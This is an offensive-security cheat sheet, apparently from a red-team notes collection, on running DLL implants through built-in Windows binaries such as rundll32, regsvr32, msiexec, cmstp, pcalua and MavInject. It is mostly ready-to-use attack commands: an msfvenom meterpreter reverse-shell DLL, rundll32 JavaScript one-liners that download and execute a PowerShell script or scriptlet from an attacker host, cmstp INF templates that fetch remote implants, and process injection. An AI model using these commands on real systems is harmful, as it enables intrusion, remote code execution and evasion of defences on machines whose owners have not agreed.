---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - living-off-the-land
  - T1085
  - T1191
  - windows
---
# DLL Execution

## `rundll32.exe`

Generate a DLL implant.

```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=<IP> lport=<PORT> -f dll -o implant.dll
```

Then execute it with `StartW` entry point.

```
C:\> rundll32.exe implant.dll,StartW
```

To execute the **Control Panel Items** (`.cpl`) implant with entry point either `Control_RunDLL` or `Control_RunDLLAsuser`.

```
C:\> rundll32.exe shell32.dll,Control_RunDLL implant.cpl

C:\> rundll32.exe shell32.dll,Control_RunDLLAsuser implant.cpl
```

A custom implant can be compiled using the `.cpl` Windows features.

```
C:\> rundll32.exe implant.dll,Control_RunDLL
```

Execute a JavaScript that runs a PowerShell script that is downloaded from a remote web site.

```
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http[s]://<IP>[:PORT]/implant.ps1')");
```

Execute a JavaScript that runs `calc.exe` and then kills the `rundll32.exe` process that was started.

```
C:\> rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();h=new%20ActiveXObject("WScript.Shell").Run("calc.exe", 0, true);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);}
```

Execute a scriptlet implant from a web server.

```
C:\> rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http[s]://<IP>[:PORT]/implant.sct")"
```

## `regasm.exe`

```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe
```

Loads the target .DLL file and executes the RegisterClass function.

```
C:\> regasm.exe AllTheThingsx64.dll
```

Loads the target .DLL file and executes the UnRegisterClass function.

```
C:\> regasm.exe /U AllTheThingsx64.dll
```

## `regsvcs.exe`

```
C:\> regsvcs.exe AllTheThingsx64.dll
```

## `regsvr32.exe`

Execute DLL implant.

```
C:\> regsvr32.exe /s implant.dll
```

## `msiexec.exe`

Execute the DLL implant  (calls `DLLRegisterServer`).

```
C:\> msiexec.exe /y "C:\path\to\implant.dll"
```

Unregisters the target DLL.

```
C:\> msiexec.exe /z "C:\path\to\implant.dll"
```

## `odbcconf.exe`

```
C:\> odbcconf.exe /a {regsvr.exe C:\path\to\implant.dll}
```

## `cmstp.exe`

Fileless scriptlet implant template

```
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
UnRegisterOCXs=UnRegisterOCXSection

[UnRegisterOCXSection]
%11%\scrobj.dll,NI,http[s]://<IP>[:PORT]/implant.sct

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Yay"
ShortSvcName="Yay"
```

DLL dropper implant template.

```
[version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall_SingleUser]
RegisterOCXs=RegisterOCXSection

[RegisterOCXSection]
C:\path\to\implant.dll
\\<IP>\implant.dll

[Strings]
AppAct = "SOFTWARE\Microsoft\Connection Manager"
ServiceName="Pentestlab"
ShortSvcName="Pentestlab"
```

Execute implant.

```
C:\> cmstp.exe /ni /s implant.inf
```

Execute fileless implant.

```
C:\> cmstp.exe /ni /s http[s]://<IP>[:PORT]/implant.inf
```

## `control.exe`

```
C:\> control.exe .\reflective_implant_loader.dll

C:\> control.exe .\reflective_implant_loader.cpl
```

## `pcalua.exe`

```
C:\> pcalua.exe -a .\implant.exe

C:\> pcalua.exe -a \\<attacker_IP>\<share_name>\implant.dll

C:\> pcalua.exe -a .\implant.cpl
```

## `MavInject.exe`

Inject DLL implant in a process ID.

```
C:\> MavInject.exe <pid> /INJECTRUNNING C:\path\to\implant.dll
```

---
## References

### Backlinks

- [[DLL Injection]]

- [[07 - Tactics & Techniques & Procedures (TTPs) Phases/C - Initial Access/0x01 - Weaponization/0xC - Client-Side Attacks/Delivery Methods/Command and Scripting Interpreter/Desktop/Windows/Code Execution/DotNET]]

- [[HTA]]

- [[Scriptlet]]

- [[Advpack]]

- [[Pcalua]]

### LOLBAS

- [LOLBAS: Regasm](https://lolbas-project.github.io/lolbas/Binaries/Regasm/)

- [LOLBAS: Regsvcs](https://lolbas-project.github.io/lolbas/Binaries/Regsvcs/)

- [LOLBAS: Msiexec](https://lolbas-project.github.io/lolbas/Binaries/Msiexec/)

- [LOLBAS: Odbcconf](https://lolbas-project.github.io/lolbas/Binaries/Odbcconf/)

- [LOLBAS: Control](https://lolbas-project.github.io/lolbas/Binaries/Control/)

- [LOLBAS: Mavinject](https://lolbas-project.github.io/lolbas/Binaries/Mavinject/)

- [LOLBAS: Setupapi](https://lolbas-project.github.io/lolbas/Libraries/Setupapi/)

- [LOLBAS: leadvpack](https://lolbas-project.github.io/lolbas/Libraries/Ieadvpack/)

- [LOLBAS: Certoc](https://lolbas-project.github.io/lolbas/Binaries/Certoc)

### Red Team Notes

- [Red Team Notes: Control Panel Item](https://www.ired.team/offensive-security/code-execution/t1196-control-panel-item-code-execution)

- [Red Team Notes: Forcing `iexplore.exe` to Load a Malicious DLL via COM Abuse](https://www.ired.team/offensive-security/code-execution/forcing-iexplore.exe-to-load-a-malicious-dll-via-com-abuse)

### DMCXBlue

- [DMCXBlue: Rundll32](https://dmcxblue.gitbook.io/red-team-notes/execution/untitled)